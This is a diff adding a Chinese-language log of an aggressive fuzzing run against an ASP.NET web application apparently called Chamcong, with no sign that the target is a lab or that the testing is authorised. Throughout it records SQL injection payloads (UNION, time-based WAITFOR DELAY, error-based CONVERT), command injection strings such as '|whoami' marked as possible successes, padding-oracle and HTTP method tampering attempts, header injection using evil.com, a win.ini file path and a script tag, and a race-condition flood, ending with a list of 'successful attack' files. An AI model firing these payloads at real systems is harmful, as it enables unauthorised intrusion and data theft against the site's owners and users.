@@ -1,0 +1,114 @@
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+💀 死磕到底 - Chamcong极限深度Fuzz
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+[深度1] ASP.NET Padding Oracle攻击
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+原始ViewState: /wEPDwULLTE4MzUzOTEyODUPZBYCAgMPZBYKAgEPDxYCHgRUZXh0BRZJTiBC4bqiTkcgQ0jhuqRNIEPD...
+
+[深度2] 目录遍历 - 1000+ Payload
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+[深度3] SQL注入 - 完整字符集Bypass
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+基线大小: 4205 bytes
+  Testing: MAU2'+UNION+SELECT+NULL--... ⚠️  响应差异 (4452 vs 4205, 1s)
+  Testing: MAU2'+UNION+ALL+SELECT+NULL--... ⚠️  响应差异 (4464 vs 4205, 0s)
+  Testing: MAU2'+UNION+SELECT+NULL,NULL--... ⚠️  响应差异 (4467 vs 4205, 1s)
+  Testing: MAU2'+UNION+SELECT+NULL,NULL,NULL--... ⚠️  响应差异 (4482 vs 4205, 0s)
+  Testing: MAU2'/**/UNION/**/SELECT/**/NULL--... ⚠️  响应差异 (4485 vs 4205, 1s)
+  Testing: MAU2';WAITFOR+DELAY+'0:0:5'--... ⚠️  响应差异 (4474 vs 4205, 0s)
+  Testing: MAU2';WAITFOR+DELAY+'00:00:05'--... ⚠️  响应差异 (4481 vs 4205, 1s)
+  Testing: MAU2'+WAITFOR+DELAY+'0:0:5'--... ⚠️  响应差异 (4472 vs 4205, 0s)
+  Testing: MAU2'%3bWAITFOR+DELAY+'0:0:5'--... ⚠️  响应差异 (4474 vs 4205, 1s)
+  Testing: MAU2'+AND+'1'='1... ⚠️  响应差异 (4439 vs 4205, 0s)
+  Testing: MAU2'+AND+'1'='2... ⚠️  响应差异 (4439 vs 4205, 1s)
+  Testing: MAU2'+AND+1=1--... ⚠️  响应差异 (4432 vs 4205, 0s)
+  Testing: MAU2'+AND+1=2--... ⚠️  响应差异 (4432 vs 4205, 1s)
+  Testing: MAU2'/**/AND/**/1=1--... ⚠️  响应差异 (4454 vs 4205, 0s)
+  Testing: MAU2'/**/AND/**/1=2--... ⚠️  响应差异 (4454 vs 4205, 1s)
+  Testing: MAU2';SELECT+@@VERSION--... ⚠️  响应差异 (4457 vs 4205, 0s)
+  Testing: MAU2';SELECT+USER--... ⚠️  响应差异 (4440 vs 4205, 1s)
+  Testing: MAU2';SELECT+DB_NAME()--... ⚠️  响应差异 (4453 vs 4205, 0s)
+  Testing: MAU2';SELECT+SYSTEM_USER--... ⚠️  响应差异 (4459 vs 4205, 1s)
+  Testing: MAU2'+AND+1=CONVERT(INT,@@VERSION)--... ⚠️  响应差异 (4487 vs 4205, 0s)
+  Testing: MAU2'+AND+1=CAST(@@VERSION+AS+INT)--... ⚠️  响应差异 (4485 vs 4205, 1s)
+  Testing: MAU2'||'MAU2... ⚠️  响应差异 (4429 vs 4205, 0s)
+  Testing: MAU2'+'MAU2... ⚠️  响应差异 (4424 vs 4205, 1s)
+  Testing: MAU2'%2b'MAU2... ⚠️  响应差异 (4426 vs 4205, 0s)
+  Testing: MAU2'/**/||/**/'MAU2... ⚠️  响应差异 (4457 vs 4205, 1s)
+
+[深度4] 所有参数组合Fuzz
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  Fuzzing parameter: ID
+    🔥 ID=|whoami: 可能成功!
+    🔥 ID=;whoami: 可能成功!
+    🔥 ID=`whoami`: 可能成功!
+  Fuzzing parameter: txtThang
+  Fuzzing parameter: txtNam
+  Fuzzing parameter: ListDV
+  Fuzzing parameter: ListBP
+  Fuzzing parameter: ListTO
+
+[深度5] HTTP Method篡改
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  PUT: 411 (344 bytes)
+    ⚠️  异常响应!
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd">
+<HTML><HEAD><TITLE>Length Required</TITLE>
+<META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"></HEAD>
+<BODY><h2>Length Required</h2>
+<hr><p>HTTP Error 411. The request must be chunked or have a content length.</p>
+</BODY></HTML>
+  DELETE: 405 (1293 bytes)
+  PATCH: 405 (1293 bytes)
+  OPTIONS: 200 (0 bytes)
+  TRACE: 501 (1508 bytes)
+    ⚠️  异常响应!
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>
+<title>501 - Header values specify a method that is not implemented.</title>
+<style type="text/css">
+<!--
+body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}
+fieldset{padding:0 15px 10px 15px;} 
+h1{font-size:2.4em;margin:0;color:#FFF;}
+h2{font-size:1.7em;margin:0;color:#CC0000;} 
+h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;} 
+#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:"trebuchet MS", Verdana, sans-serif;color:#FFF;
+background-color:#555555;}
+#content{margin:0 0 0 2%;position:relative;}
+.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}
+-->
+</style>
+</head>
+<body>
+  CONNECT: 405 (1293 bytes)
+
+[深度6] Header注入测试
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  X-Forwarded-For: 127.0.0.1: -
+  X-Original-URL: /admin: -
+  X-Rewrite-URL: /admin: -
+  X-Custom-IP-Authorization: 127.0.0.1: -
+  X-Forwarded-Host: evil.com: -
+  X-Host: 127.0.0.1: -
+  Referer: file:///c:/windows/win.ini: -
+  User-Agent: <script>alert(1)</script>: -
+
+[深度7] 竞态条件攻击
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  发起100个并发请求...
+  检查异常响应...
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+💀 极限深度Fuzz完成!
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🔥 成功的攻击:
+-rw-r--r-- 1 ubuntu ubuntu   34 Nov 17 16:18 param_fuzz_success.txt
+-rw-r--r-- 1 ubuntu ubuntu 4.4K Nov 17 16:18 PARAM_ID_61a2109b4c3896329bf37b237e467b35.txt
+-rw-r--r-- 1 ubuntu ubuntu 4.4K Nov 17 16:18 PARAM_ID_79ec2b2b3a6ab388b00968fd6796a380.txt
+-rw-r--r-- 1 ubuntu ubuntu 4.4K Nov 17 16:18 PARAM_ID_ea9983b09c6c03f03f51374ac15bf686.txt
